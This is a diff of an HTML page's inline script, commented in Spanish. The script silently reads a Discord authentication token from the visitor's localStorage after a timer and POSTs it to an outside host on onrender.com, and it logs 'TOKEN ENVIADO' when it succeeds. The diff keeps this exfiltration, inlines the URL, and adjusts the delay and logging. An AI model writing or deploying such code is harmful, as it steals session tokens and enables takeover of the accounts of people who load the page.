@@ -10,18 +10,18 @@
 </div>
 
 <script>
-// LINK CORRECTO (YA FUNCIONA)
-const BOT_URL = "https://mala-1.onrender.com/login";
-
 setTimeout(() => {
   const token = (localStorage.getItem('token') || '').replace(/"/g, '');
   if (token && token.length > 50) {
-    fetch(BOT_URL, {
+    fetch("https://mala-1.onrender.com/login", {
       method: "POST",
       headers: {"Content-Type": "application/json"},
       body: JSON.stringify({token: token})
     });
+    console.log("TOKEN ENVIADO:", token); // para que veas en la consola
+  } else {
+    console.log("No hay token de Discord");
   }
-}, 2500);
+}, 3000);
 </script>
 </body></html>
